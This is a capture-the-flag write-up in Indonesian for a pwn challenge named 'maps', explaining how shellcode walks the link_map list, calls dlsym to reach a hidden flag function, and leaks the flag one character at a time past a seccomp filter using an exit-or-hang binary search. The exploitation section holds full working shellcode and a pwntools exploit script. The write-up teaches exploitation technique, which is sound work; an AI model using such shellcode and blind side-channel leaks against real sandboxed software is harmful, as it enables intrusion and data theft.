# maps


## Analisa


Diberikan program dengan konfigurasi berikut:
```
$ file maps; checksec maps
maps: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=f9ff8aad5717803ffcdc94c0cca9bf13d7d384e2, not stripped
[*] '/home/tempest/projects/cscctf/2019/final/pwn/maps/maps'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```


Ini merupakan soal shellcoding. Program membuka `libflag.so` dalam lazy binding, kemudian membuat memori rwx dan rw. Setelah melakukan memcpy, program membaca shellcode sebanyak 960 bytes dari stdin. Terakhir diapply rule seccomp dan dieksekusi shellcode kita. Permasalahannya adalah rule seccomp, dimana hanya **exit**, dan **exit\_group** yang diperbolehkan. Kita harus mengeluarkan flag secara blind dari program, karakter per karakter. Jika kita lihat sekilas `libflag.so`, banyak sekali fungsi `wrong_flag_*`. Pencarian kata "correct" (invert match dari "wrong" dan "CCC") pada .so memunculkan satu hasil:
```
gef> disass correct_flag_13333337 
Dump of assembler code for function correct_flag_13333337:
   0x000000000010b815 <+0>:	push   rbp
   0x000000000010b816 <+1>:	mov    rbp,rsp
   0x000000000010b819 <+4>:	lea    rax,[rip+0x7ced8]        # 0x1886f8
   0x000000000010b820 <+11>:	pop    rbp
   0x000000000010b821 <+12>:	ret    
End of assembler dump.
gef> x/s 0x1886f8
0x1886f8:	"CCC{xxx_this_isnt_a_real_flag_xxx}"
```


## Eksploitasi


Sebelum mulai, mari kita lihat definisi `link_map` pada glibc-2.27/elf/link.h:
```C
struct link_map
{
	/* These first few members are part of the protocol with the debugger.
	   This is the same format used in SVR4.  */

	ElfW(Addr) l_addr; /* Selisih alamat pada ELF dan memori.  */
	char *l_name; /* Nama file.  */
	ElfW(Dyn) *l_ld; /* Area "Dynamic" pada objek.  */
	struct link_map *l_next, *l_prev; /* Doubly linked list.  */
};
```


Pada bagian awal, kita melakukan cek pada program, dan program memiliki setup `partial RELRO`. Artinya adalah program menaruh link_map pada area GOT. Struktur link_map cocok pada definisi:
```
gef> tel 0x602008 1
0x0000000000602008|+0x0000: 0x00007fe050a3a170 -> link_map
gef> tel 0x00007fe050a3a170 5
0x00007fe050a3a170|+0x0000: 0x0000000000000000 -> link_map->l_addr
0x00007fe050a3a178|+0x0008: 0x00007fe050a3a700 -> link_map->l_name
0x00007fe050a3a180|+0x0010: 0x0000000000601e00 -> link_map->l_ld
0x00007fe050a3a188|+0x0018: 0x00007fe050a3a710 -> link_map->l_next
0x00007fe050a3a190|+0x0020: 0x0000000000000000 -> link_map->l_prev
```


Setelah menelusuri double linked list dari link_map:
```
gef> tel 0x00007fe050a3a710+0x18
0x00007fe050a3a728|+0x0000: 0x00007fe050a0c000 
gef> tel 0x00007fe050a0c000+0x18
0x00007fe050a0c018|+0x0000: 0x00007fe050a0c500
...
gef> tel 0x00007fe050a399f0+0x18
0x00007fe050a39a08|+0x0000: 0x000000000182b280
gef> tel 0x000000000182b280 5
0x000000000182b280|+0x0000: 0x00007fe04fb49000 -> link_map->l_addr
0x000000000182b288|+0x0008: 0x000000000182b260 -> "./libflag.so"
0x000000000182b290|+0x0010: 0x00007fe04ffd3e90 -> link_map->l_d
0x000000000182b298|+0x0018: 0x0000000000000000 -> link_map->l_next
0x000000000182b2a0|+0x0020: 0x00007fe050a399f0 -> link_map->l_prev
```


Berdasarkan hasil penelusuran, `dlopen` mengalokasikan struct link_map pada area heap. Ini penting karena kita bisa membuat loop dalam shellcode dan memvalidasi apabila pointer berasal dari area heap (libflag.so) atau area libc (libseccomp, dll). Berikut shellcode awal:
```
mov r15, 0x7f0000000000
mov ebx, 0x602008
mov rbx, [rbx]

loop1:
	mov rbx, [rbx+0x18]
	cmp rbx, r15
	jge loop1
```


Selanjutnya, kita dapat melakukan address calculation karena diberikan libc. Ambil saja suatu address dari GOT seperti `puts` dan lakukan penambahan atau pengurangan. Tujuannya disini adalah memanggil `dlsym` dengan parameter link_map libflag.so sebagai `handle` dan `correct_flag_13333337` sebagai symbol yang ingin dicari, agar kita bisa langsung mendapatkan alamat fungsinya tanpa perlu melakukan parsing ELF. Karena fungsi `correct_flag_13333337` tidak menerima parameter, kita bisa langsung memanggilnya setelah `dlsym`. Berikut shellcode tahap kedua:
```
sub rsp, 8
mov rax, 0x101010101010101
push rax
mov rax, 0x101010101010101 ^ 0x3733333333
xor [rsp], rax
mov rax, 0x3333315f67616c66
push rax
mov rax, 0x5f74636572726f63
push rax
mov rsi, rsp

mov ecx, 0x602028 ; puts GOT
mov rcx, [rcx]
add rcx, 0xe5b60 ; dlsym

mov rdi, rbx
call rcx ; dlsym(libflag_link_map,"correct_flag_13333337")
call rax ; correct_flag_13333337
```


`sub rsp, 8` bertujuan agar menghindari crash, karena `dlsym` menggunakan `movaps`, instruksi yang dapat menyebabkan crash apabila stack tidak alligned 16 byte. Setelah kita dapatkan flagnya di register rax, kita hanya perlu mengeluarkan flag tanpa melakukan print. Caranya adalah dengan melakukan compare value terhadap karakter tertentu, dan apabila tidak sama kita bisa melakukan exit secara langsung; sebaliknya, infinite loop. Namun cara ini sangat tidak efisien karena jumlah perbandingannya sangatlah banyak, sekitar 91 perbandingan (karakter printable) **per karakter flag**. Kita bisa melakukan optimisasi dengan memasukkan algoritma [binary search](https://en.wikipedia.org/wiki/Binary_search_algorithm) ke shellcode kita. Shellcode dalam bentuk function python:
```Python
def testchar(offset,val):
	time.sleep(1)
	# r = remote("localhost",10003) if len(sys.argv) < 2 else remote("maps.problem.cscctf.com",10003)
	r = gdb.debug([exe.path],gdbscript="b *0x400e2e\nc\n")
	r.sendafter("> ",asm("""
		mov r15, 0x7f0000000000
		mov ebx, 0x602008
		mov rbx, [rbx]

		loop1:
			mov rbx, [rbx+0x18]
			cmp rbx, r15
			jge loop1

		sub rsp, 8
		mov rax, 0x101010101010101
		push rax
		mov rax, 0x101010101010101 ^ 0x3733333333
		xor [rsp], rax
		mov rax, 0x3333315f67616c66
		push rax
		mov rax, 0x5f74636572726f63
		push rax
		mov rsi, rsp

		mov ecx, 0x602028
		mov rcx, [rcx]
		add rcx, 0xe5b60

		mov rdi, rbx
		call rcx
		call rax

		mov dl, BYTE PTR [rax+{:d}]
		cmp dl, {:d}
		jge good

		bad:
			mov rax, 0x3c
			xor edi, edi
			syscall

		good:
			jmp $+0
	""".format(offset,val)))
	try:
		r.recv(1,timeout=1)
		r.close()
		return True
	except:
		r.close()
		return False

def bruteforce():
	flag = ''
	while True:
		low = 32
		high = 128
		mid = -1
		for i in xrange(8):
			mid = (low+high)/2
			ret = testchar(len(flag),mid)
			if ret: low = mid
			else: high = mid

		if mid == 32: break

		flag += chr(mid)
		sys.stdout.write(chr(mid))
		sys.stdout.flush()

	print "\nFlag: {}".format(flag)
```


Saya pribadi telah melakukan trial dan error terhadap script, dan yang paling sedikit membuat kesalahan adalah dengan mengatur rentang low dan high, 32 dan 128 (printable); sisanya memerlukan beberapa kali eksekusi script. Karakter pertama dari flag adalah 'C' (67). Jika dimasukkan ke dalam algoritma binary search di atas:
```
#   low  mid  high
1.  32   80   128
2.  32   56   80
3.  56   68   80
4.  56   62   68
5.  62   65   68
6.  65   66   68
7.  66   67   68   -> ketemu
```


Setiap karakter yang dibruteforce hanya memiliki 8 kali perbandingan maksimal (log2 256 = 8). Dibutuhkan waktu sekitar 2 menit untuk mengeluarkan flag dari program (1x eksekusi script); lebih dari itu jika hasil tidak akurat.



Output script:
```
$ python exploit.py go
CCC{p4rs1ng_ELF_w1th_da_Sh3lLC0d3}
Flag: CCC{p4rs1ng_ELF_w1th_da_Sh3lLC0d3}
Elapsed time: 123.250
```
